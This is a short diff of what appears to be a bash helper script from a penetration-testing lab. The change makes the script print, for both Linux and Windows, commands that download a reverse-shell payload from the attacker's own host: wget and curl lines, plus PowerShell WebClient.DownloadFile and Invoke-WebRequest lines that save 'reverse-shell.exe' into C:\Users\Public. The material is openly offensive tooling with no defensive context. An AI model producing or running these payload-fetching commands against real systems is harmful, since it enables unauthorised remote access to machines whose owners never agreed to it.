@@ -190,19 +190,15 @@ cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9
 fpath=$(cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9 | cut -d "/" -f5)
 echo ""
 
-if [ $os = 'linux' ] ; then
-   echo "wget http://"$lhost":80/revshell/"$fpath
-   echo "curl -OL http://"$lhost":80/revshell"$fpath
-fi
-if [ $os = 'windows' ] ; then
-   str1='powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('
-   str2="'http://"$lhost":80/revshell/"$fpath"','C:\Users\Public\reverse-shell.exe')"
-   str3='"'
-   echo $str1$str2$str3
-   str1='Invoke-WebRequest -Uri "'
-   str2='http://'$lhost':80/revshell/'$fpath'" -OutFile "C:\Users\Public\reverse-shell.exe"'
-   echo $str1$str2
-fi
+echo "wget http://"$lhost":80/revshell/"$fpath
+echo "curl -OL http://"$lhost":80/revshell"$fpath
+str1='powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('
+str2="'http://"$lhost":80/revshell/"$fpath"','C:\Users\Public\reverse-shell.exe')"
+str3='"'
+echo $str1$str2$str3
+str1='Invoke-WebRequest -Uri "'
+str2='http://'$lhost':80/revshell/'$fpath'" -OutFile "C:\Users\Public\reverse-shell.exe"'
+echo $str1$str2
 
 if [ $input = 'y' ] ; then
    echo "cd /root/www" >> /root/Lab/$IP/sandbox/temp.sh
